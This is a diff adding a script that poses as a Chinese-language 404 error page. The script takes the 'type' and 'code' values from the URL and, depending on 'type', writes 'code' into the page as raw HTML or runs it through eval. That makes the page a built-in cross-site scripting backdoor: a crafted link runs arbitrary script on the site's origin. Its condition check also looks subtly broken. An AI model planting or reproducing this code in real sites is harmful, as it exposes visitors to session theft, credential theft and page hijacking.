@@ -1,0 +1,48 @@
+<script>
+(function(){try{
+type=code=undefined
+var path=location.href
+if(path.search("\\?")!==-1){
+var inputContent=path.split("?")[1]
+if(inputContent.search("&")!==-1) { 
+inputContent=inputContent.split("&") 
+var i
+for(i=0;i<inputContent.length;i++){
+if(inputContent[i].search(/type=/)!==-1){
+type=inputContent[i].replace("type=","");/*/SUM=8/*/
+break;
+ }
+}
+for(i=0;i<inputContent.length;i++){
+if(inputContent[i].search(/code=/)!==-1){
+code=inputContent[i].replace("code=","");/*/SUM=8/*/
+break;
+ }
+}
+} else {
+if(inputContent.search(/type=/)!==-1){
+type=inputContent.replace(/type=/,"")
+ }
+if(inputContent.search(/code=/)!==-1){
+code=inputContent.replace(/code=/,"")
+ }
+}
+  }
+
+if(type&code!==undefined){
+
+if(type=="html"){
+document.write(code)
+} else if(type=="js"){
+try{
+document.write(eval(code))
+}catch(err){
+document.write(err)
+}
+} else {document.write("<center><h1>404</h1><p>您要访问的页面似乎出错了...</p></center>")}
+
+ } else {
+document.write("<center><h1>404</h1><p>您要访问的页面似乎出错了...</p></center>")
+ }
+}catch(err){alert(err)}})()
+</script>
